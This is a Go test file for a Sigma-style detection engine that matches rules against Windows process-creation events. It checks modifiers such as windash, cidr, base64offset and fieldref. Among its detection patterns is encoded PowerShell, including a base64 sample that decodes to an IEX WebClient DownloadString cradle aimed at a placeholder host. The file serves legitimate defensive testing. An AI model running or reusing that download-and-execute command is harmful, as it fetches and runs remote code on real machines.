package detection

import (
	"testing"

	"DFIRFlow/internal/normalizer"
)

func TestMatch(t *testing.T) {
	cmd := func(s string) map[string]string { return map[string]string{"CommandLine": s, "Empty": ""} }
	sec := func(md map[string]string) normalizer.Event {
		return evtx("Security", "Microsoft-Windows-Security-Auditing", 4688, md, 1)
	}
	for _, c := range []struct {
		det  string
		ev   normalizer.Event
		want bool
	}{
		{"CommandLine: 'powershell -enc'", sec(cmd("PowerShell -ENC")), true},
		{"CommandLine: 'powershell'", sec(cmd("powershell.exe")), false},
		{"CommandLine: ['a', 'b']", sec(cmd("b")), true},
		{"CommandLine: ['a', 'b']", sec(cmd("c")), false},
		{"CommandLine|contains|all: ['-nop', '-enc']", sec(cmd("x -NoP -enc y")), true},
		{"CommandLine|contains|all: ['-nop', '-enc']", sec(cmd("x -enc y")), false},
		{"CommandLine: 'po*ll -?nc'", sec(cmd("powershell -enc")), true},
		{"CommandLine: 'po*ll -?nc'", sec(cmd("powershell -nc")), false},
		{`CommandLine: 'a\*b'`, sec(cmd("a*b")), true},
		{`CommandLine: 'a\*b'`, sec(cmd("axxb")), false},
		{`CommandLine: 'a\?b'`, sec(cmd("axb")), false},
		{`CommandLine: 'c:\\temp\\x'`, sec(cmd(`C:\temp\x`)), true},
		{`CommandLine: 'c:\temp'`, sec(cmd(`C:\temp`)), true},
		{"CommandLine|contains: 'shell'", sec(cmd("powershell.exe")), true},
		{"CommandLine|startswith: 'power'", sec(cmd("powershell.exe")), true},
		{"CommandLine|startswith: 'shell'", sec(cmd("powershell.exe")), false},
		{"CommandLine|endswith: '.EXE'", sec(cmd("powershell.exe")), true},
		{"CommandLine|endswith: 'power'", sec(cmd("powershell.exe")), false},
		{`CommandLine|contains: '\Run\'`, sec(cmd(`HKU\Run\a`)), true},
		{`CommandLine|startswith: 'HKU\'`, sec(cmd(`HKU\Run`)), true},
		{`CommandLine|contains: '\Run\'`, sec(cmd(`HKU\Run*`)), false},
		{"CommandLine|re: '^Power'", sec(cmd("Powershell")), true},
		{"CommandLine|re: '^power'", sec(cmd("Powershell")), false},
		{"CommandLine|re|i: '^power'", sec(cmd("Powershell")), true},
		{"CommandLine|re: 'shell'", sec(cmd("Powershell -x")), true},
		{"CommandLine: null", sec(nil), true},
		{"Empty: null", sec(cmd("x")), true},
		{"CommandLine: null", sec(cmd("x")), false},
		{"Missing: 'x'", sec(cmd("x")), false},
		{"Missing|contains: ''", sec(cmd("x")), false},
		{"EventID: 4688", sec(nil), true},
		{"EventID: [4624, 4688]", sec(nil), true},
		{"EventID: 4624", sec(nil), false},
		{"Channel: security", sec(nil), true},
		{"Provider_Name: 'Microsoft-Windows-Security-Auditing'", sec(nil), true},
		{"Computer: 'pc01'", sec(map[string]string{"System.Computer": "PC01"}), true},
		{"System.Level: 4", sec(map[string]string{"System.Level": "4"}), true},

		// Spec 013 : modificateurs (research R6, SC-004).
		{"CommandLine|windash|contains: ' -enc '", sec(cmd("powershell -enc x")), true},
		{"CommandLine|windash|contains: ' -enc '", sec(cmd("powershell /enc x")), true},
		{"CommandLine|windash|contains: ' -enc '", sec(cmd("powershell \u2013enc x")), true},
		{"CommandLine|windash|contains: ' -enc '", sec(cmd("powershell \u2014ENC x")), true},
		{"CommandLine|windash|contains: ' -enc '", sec(cmd("powershell \u2015enc x")), true},
		{"CommandLine|windash|contains: ' -enc '", sec(cmd("powershell xenc x")), false},
		{"CommandLine|windash: 'a-enc'", sec(cmd("a/enc")), false},
		{"CommandLine|windash: 'a-enc'", sec(cmd("a-enc")), true},
		{"CommandLine|cased|windash|contains: ' -Enc'", sec(cmd("x /Enc")), true},
		{"CommandLine|cased|windash|contains: ' -Enc'", sec(cmd("x /enc")), false},
		{"DestinationIp|cidr: '10.0.0.0/8'", sec(map[string]string{"DestinationIp": "10.1.2.3"}), true},
		{"DestinationIp|cidr: '10.0.0.0/8'", sec(map[string]string{"DestinationIp": "11.1.2.3"}), false},
		{"DestinationIp|cidr: ['10.0.0.0/8', 'fe80::/10']", sec(map[string]string{"DestinationIp": "fe80::1"}), true},
		{"DestinationIp|cidr: 'fe80::/10'", sec(map[string]string{"DestinationIp": "2001:db8::1"}), false},
		{"DestinationIp|cidr: '10.0.0.0/8'", sec(map[string]string{"DestinationIp": "host.local"}), false},
		{"CommandLine|base64|contains: 'abc'", sec(cmd("x YWJj y")), true},
		{"CommandLine|base64|contains: 'abc'", sec(cmd("x ywjj y")), false},
		{"CommandLine|base64offset|contains: 'IEX'", sec(cmd("eElFWA==")), true},
		{"CommandLine|base64offset|contains: 'IEX'", sec(cmd("eHhJRVg=")), true},
		{"CommandLine|base64offset|contains: 'IEX'", sec(cmd("eHh4SUVY")), true},
		{"CommandLine|base64offset|contains: 'IEX'", sec(cmd("ehh4suvy")), false},
		{"CommandLine|base64offset|contains|all: ['IEX', 'Invoke']", sec(cmd("eHhJRVggeXl5IEludm9rZQ==")), true},
		{"CommandLine|base64offset|contains|all: ['IEX', 'Invoke']", sec(cmd("eHhJRVg=")), false},
		{"CommandLine|wide|base64offset|contains: 'IEX'", sec(cmd("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAvAGEAIgApAA==")), true},
		{"CommandLine|utf16le|base64offset|contains: 'Net.WebClient'", sec(cmd("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAvAGEAIgApAA==")), true},
		{"CommandLine|base64offset|contains: 'IEX'", sec(cmd("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAvAGEAIgApAA==")), false},
		{"CommandLine|utf16be|base64|contains: 'abc'", sec(cmd("x AGEAYgBj")), true},
		{"CommandLine|utf16be|base64|contains: 'abc'", sec(cmd("x YWJj")), false},
		{"Empty|exists: true", sec(cmd("x")), true},
		{"CommandLine|exists: true", sec(cmd("x")), true},
		{"Missing|exists: true", sec(cmd("x")), false},
		{"Missing|exists: false", sec(cmd("x")), true},
		{"CommandLine|exists: false", sec(cmd("x")), false},
		{"CommandLine|cased|endswith: '.EXE'", sec(cmd("a.EXE")), true},
		{"CommandLine|cased|endswith: '.EXE'", sec(cmd("a.exe")), false},
		{"SourceUser|fieldref: TargetUser", sec(map[string]string{"SourceUser": "a", "TargetUser": "a"}), true},
		{"SourceUser|fieldref: TargetUser", sec(map[string]string{"SourceUser": "a", "TargetUser": "A"}), true},
		{"SourceUser|fieldref: TargetUser", sec(map[string]string{"SourceUser": "a", "TargetUser": "b"}), false},
		{"SourceUser|fieldref: TargetUser", sec(map[string]string{"SourceUser": "a"}), false},
		{"SourceUser|fieldref|cased: TargetUser", sec(map[string]string{"SourceUser": "a", "TargetUser": "A"}), false},
	} {
		r := mustRule(t, rule("", "  sel:\n    "+c.det+"\n  condition: sel\n"))
		if got := r.match(&c.ev, nil); got != c.want {
			t.Errorf("%s on %v: %v, want %v", c.det, c.ev.Metadata, got, c.want)
		}
	}

	// Sélection en liste de tables : l'une ou l'autre.
	r := mustRule(t, rule("", "  sel:\n    - CommandLine: a\n    - CommandLine: b\n      Empty: x\n  condition: sel\n"))
	if !r.match(ptr(sec(cmd("a"))), nil) || r.match(ptr(sec(cmd("b"))), nil) {
		t.Error("list of maps")
	}
	// Plusieurs champs d'une table : tous.
	r = mustRule(t, rule("", "  sel:\n    EventID: 4688\n    CommandLine: a\n  condition: sel\n"))
	if !r.match(ptr(sec(cmd("a"))), nil) || r.match(ptr(sec(cmd("b"))), nil) {
		t.Error("map AND")
	}
}

func ptr(ev normalizer.Event) *normalizer.Event { return &ev }

// TestGlobFast : le chemin rapide donne le même résultat que le cas général.
func TestGlobFast(t *testing.T) {
	pats := []string{"", "*", "**", "abc", "abc*", "*abc", "*abc*", `a\*c`, "*A.EXE", "*\u00e9t\u00e9*", "a?c*"}
	vals := []string{"", "abc", "ABC", "xabcx", "xab", "a*c", "C:\\A.exe", "\u00c9T\u00c9", "\u212a", "zabc"}
	for _, p := range pats {
		for _, cased := range []bool{false, true} {
			for _, pos := range []string{"", "contains", "startswith", "endswith"} {
				g := mods{pos: pos, cased: cased}.wrap(compileGlob(p, cased, false))
				slow := g
				slow.shape = 0
				for _, v := range vals {
					if g.match(v) != slow.match(v) {
						t.Errorf("%q cased=%v %s on %q: fast %v, slow %v", p, cased, pos, v, g.match(v), slow.match(v))
					}
				}
			}
		}
	}
}
